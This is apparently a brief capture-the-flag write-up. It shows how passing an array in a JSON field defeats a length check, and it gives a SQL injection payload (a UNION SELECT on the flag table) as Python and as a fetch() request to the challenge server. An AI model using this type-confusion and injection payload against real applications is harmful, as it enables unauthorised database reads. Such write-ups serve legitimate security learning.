Since it is interpreted as JSON and the len is being looked at, it is bypassed with an array. The rest is just normal SQLi.

```python
code = [') UNION SELECT flag FROM flag; --',1]
cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
# SELECT name FROM country WHERE code=UPPER('[') UNION SELECT flag FROM flag; --', 1]')
```

```js
fetch("http://34.170.146.252:24059/api/search", {
  "headers": {
    "accept": "*/*",
    "accept-language": "ja,en-US;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache"
  },
  "referrer": "http://34.170.146.252:24059/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"code\":[\") UNION SELECT flag FROM flag; --\",1]}",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```
